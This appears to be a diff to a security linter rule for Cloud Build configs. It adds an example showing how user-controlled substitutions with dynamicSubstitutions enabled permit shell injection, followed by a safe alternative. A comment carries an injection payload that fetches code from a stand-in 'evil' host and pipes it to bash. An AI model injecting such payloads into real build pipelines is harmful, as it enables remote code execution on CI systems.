@@ -64,6 +64,35 @@ RULE = Rule(
         "``--ignore-file`` after verifying the user sub never "
         "feeds bash re-evaluation.",
     ),
+    exploit_example=(
+        "# Vulnerable: ``dynamicSubstitutions: true`` expands\n"
+        "# ``${USER_INPUT}`` at args-evaluation time. A trigger\n"
+        "# substitution carrying ``v1.0\";curl evil|bash;\"`` lands\n"
+        "# the metacharacters in the args array — the step's shell\n"
+        "# parses them as separate commands.\n"
+        "substitutions:\n"
+        "  _TAG: v1.0\n"
+        "options:\n"
+        "  dynamicSubstitutions: true\n"
+        "steps:\n"
+        "  - name: gcr.io/cloud-builders/docker@sha256:abc123...\n"
+        "    args: [build, -t, \"image:${_TAG}\", .]\n"
+        "\n"
+        "# Safe: either disable dynamicSubstitutions (use literal\n"
+        "# substitutions instead) or pass the substitution through\n"
+        "# an env var and let the shell handle quoting. The\n"
+        "# substitution becomes a single string argument the\n"
+        "# attacker can't escape from.\n"
+        "substitutions:\n"
+        "  _TAG: v1.0\n"
+        "steps:\n"
+        "  - name: gcr.io/cloud-builders/docker@sha256:abc123...\n"
+        "    entrypoint: bash\n"
+        "    env: [TAG=${_TAG}]\n"
+        "    args:\n"
+        "      - -c\n"
+        "      - docker build -t \"image:$TAG\" ."
+    ),
 )
 
 # ``$_FOO`` or ``${_FOO}``, the leading underscore distinguishes user
